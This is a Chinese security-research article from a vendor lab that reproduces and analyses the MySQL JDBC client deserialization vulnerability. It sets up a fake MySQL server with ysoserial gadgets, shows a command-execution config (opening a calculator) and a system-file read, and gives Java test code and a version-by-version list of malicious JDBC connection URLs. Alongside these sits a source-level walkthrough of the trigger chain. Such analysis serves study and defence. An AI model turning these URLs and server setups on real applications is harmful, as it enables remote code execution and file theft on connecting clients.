#  MYSQL JDBC反序列化漏洞利用和分析   
原创 ye1s  山石网科安全技术研究院   2023-11-23 14:47  
  
本漏洞其实就是服务器响应结果给客户端，客户端会进行反序列化从而造成反序列化漏洞。  
  
01  
  
**JDBC简介**  
  
JDBC（Java DataBase Connectivity）是Java和数据库之间的一个桥梁，是一个 规范 而不是一个实现，能够执行SQL语句。它由一组用Java语言编写的类和接口组成。各种不同类型的数据库都有相应的实现，本文中的代码都是针对MySQL数据库实现的。  
  
简单实例：  
```
String Driver = "com.mysql.cj.jdbc.Driver"; //从 mysql-connector-java 6开始
//String Driver = "com.mysql.jdbc.Driver"; // mysql-connector-java 5
String DB_URL="jdbc:mysql://127.0.0.1:3306/security";
//1.加载启动
Class.forName(Driver);
//2.建立连接
Connection conn = DriverManager.getConnection(DB_URL,"root","root");
//3.操作数据库，实现增删改查
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from users");
//如果有数据，rs.next()返回true
while(rs.next()){
  System.out.println(rs.getString("id")+" : "+rs.getString("username"));
}

```  
  
  
  
02  
  
**漏洞复现**  
  
**搭建一个恶意mysql服务器**  
  
  
MySQL服务器使用：https://github.com/fnmsd/MySQL_Fake_Server，  
这是一个可以方便的辅助MySQL客户端文件读取和提供MySQL JDBC反序列化漏洞所需序列化数据的假服务器。  
  
修改config.json里的配置，  
将ysoserialPath的值 修改为ysoserial工具的位置  
```
 "config":{
        "ysoserialPath":"ysoserial-0.0.6-SNAPSHOT-all.jar",
    }
```  
  
**1）命令执行**  
  
修改yso的值，Jdk7u21名可任意，后面DB_URL地址要用到，为user的名 CommonsCollections5为ysoserial的Gadget的名，[]里面为要执行的命令  
```
  "yso":{
        "Jdk7u21":[" CommonsCollections5","open -a calculator"]
    }

```  
  
**2）文件读取**  
  
将fileread的文件路径设置为你想要读取的文件位置  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gVAdlGf0S5ndYWK7xF4HPCfc4WgWhgYggKzePic2icYTZ0mnxXY66ibgMA/640?wx_fmt=png&from=appmsg "")  
  
python server.py 启动 ，默认端口为3306，可以修改  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gf79FMSVu6UrH4DmFr8gmD8zqPsp7Eib56Q2INKupiaFmlo92bicSRZrtw/640?wx_fmt=png&from=appmsg "")  
  
‍  
  
**客户端连接测试代码**  
  
```
import java.sql.Connection;
import java.sql.DriverManager;

public class Test{
    public static void main(String[] args) throws Exception{
        String driver = "com.mysql.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=Jdk7u21";//8.x使用
        //String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=Jdk7u21";//5.x使用
        Class.forName(driver);
        Connection conn = DriverManager.getConnection(DB_URL);
    }
}

```  
  
user设置为Jdk7u21 命令执行  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0g5hlr1pqrrkZBW6ibFqtJef9sLdoDQ1OQmgmwIoFsqLYDtiaAhOn6UE8w/640?wx_fmt=png&from=appmsg "")  
  
user设置为linux_passwd 读取文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gGoibcCZLianb7BY16baia2hrZoHHroG94AI8Tu6IzdKjDOmmUanaaHbKQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gDabWTcDBT2qLomufIciaT24RlryEsXcaXiaqhk30TQQ2LBPL41Rx3ejQ/640?wx_fmt=png&from=appmsg "")  
  
  
03  
  
**漏洞原理分析**  
  
‍  
  
**ServerStatusDiffInterceptor触发方式**  
  
  
queryInterceptors是一个逗号分隔的Class列表，这些Class实现了com.mysql.cj.interceptors.QueryInterceptor接口。它们在执行Query之前和之后进行操作，从而影响结果。可以将其视为在Query执行前后插入操作的效果。  
  
autoDeserialize是一个配置选项，用于自动检测和反序列化存储在BLOB字段中的对象。因此，如上所述，如果要触发queryInterceptors，需要触发SQL Query。在获取数据库连接时，会触发一些请求，如SET NAMES utf和set autocommit=1等，这些请求会触发我们配置的queryInterceptors。  
  
ServerStatusDiffInterceptor的preProcess方法是在执行SQL Query之前需要执行的方法。它调用了populateMapWithSessionStatusValues方法。漏洞的触发点在com.mysql.cj.jdbc.result.ResultSetImpl.getObject()方法中，存在反序列化操作：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gHZjIadYicrCP3M3myrYFe8Zm9mmKdSmPeLhRX8IfVAyQ9ic022evSgrA/640?wx_fmt=png&from=appmsg "")  
  
现在就是找调用 getObject的地方了，在  
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()方法。  
  
当在JDBC URL中设置属性queryInterceptors为ServerStatusDiffInterceptor时，ServerStatusDiffInterceptor作为一个拦截器会被调用。在执行查询语句时，拦截器的preProcess和postProcess方法会被触发，最终会通过调用链调用到getObject()方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gGfMUbhs5ukPYZKjYnt3MrDTXvQicHyE14iaaXQK3iaUicKe1QXbCfpkdSw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gVvnXbQqVCLStlaB9N6aOqfZR5IzW6FpjTzSkzz0WzuO8Eub9EdAx4Q/640?wx_fmt=png&from=appmsg "")  
  
在JDBC连接数据库的过程中，会执行SHOW SESSION STATUS查询，并在处理结果时调用resultSetToMap方法进行进一步操作。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gFicDeCo8jIogJRjiauZ0WnXPDIKMmGmoibCqP1pxNXuoyrzkrFPicwqOBw/640?wx_fmt=png&from=appmsg "")  
  
在这里我们还需要关注getObject方法的columnIndex参数的值，因为后面会用到它。到目前为止，我们已经找到了一个可利用的链条。首先设置拦截器，然后进入getObject方法，在getObject方法中，只要autoDeserialize为True，就可以进入最后的readObject方法。这也解释了POC中queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true的来源。  
  
‍  
  
**detectCustomCollations触发方式**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gSiadYUibUBRw8icrzCkgKFpHmzgUmYXkyeEnanxf3JFo4IT31JRnCPic2Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0ghBDsiaPNKmRwOFQyicQUwpPp2IicnPlnEHS3YHPxTEWBwwjiaHbicbYdaug/640?wx_fmt=png&from=appmsg "")  
  
在服务器版本大于等于4.1.0且detectCustomCollations选项为true的情况下，可以获取SHOW COLLATION的结果。请注意，5.1.28版本的判断条件只有在服务器版本大于4.1.0时才成立。  
  
在获取SHOW COLLATION结果后，只有当服务器版本大于等于5.0.0时，才会进入上一节提到的resultSetToMap方法，并触发反序列化操作。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnT2cXacOsAwlf2fbaxGOk0gVNfz5rsOXDCDWA3iaVL6LdrKUwuKaPCaQ1OYdtfQbLNgibl6jjPR6cfA/640?wx_fmt=png&from=appmsg "")  
  
在这里，getObject方法与前文相同，不再重复说明。在这里只需要字段2或3为BLOB类型，用于存储我们的序列化数据。然而，从5.1.41版本开始，不再使用getObject方法获取SHOW COLLATION的结果，因此该方法失效。在5.1.18版本以下，同样不使用getObject方法获取SHOW COLLATION的结果，因此也无法使用该方法。  
  
  
04  
  
**利用链总结**  
  
用户名是基于MySQL Fake Server工具的，具体使用中请自行修改。  
  
‍  
  
**ServerStatusDiffInterceptor触发**  
  
- 8.x：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc  
  
- 6.x（属性名不同）：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc  
  
- 5.1.11及以上的5.x版本（包名没有了cj）：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc  
  
- 5.1.10及以下的5.1.X版本：同上，但是需要连接后执行查询。  
  
- 5.0.x：还没有ServerStatusDiffInterceptor这个东西  
  
‍  
  
‍  
  
**detectCustomCollations触发**  
  
- 5.1.41及以上：不可用  
  
- 5.1.29-5.1.40：jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc  
  
- 5.1.19-5.1.28：jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc  
  
- 5.1.18以下的5.1.x版本：不可用  
  
- 5.0.x版本不可用  
  
‍  
  
参考文章：  
  
https://www.anquanke.com/post/id/203086  
  
 https://xz.aliyun.com/t/8159  
  
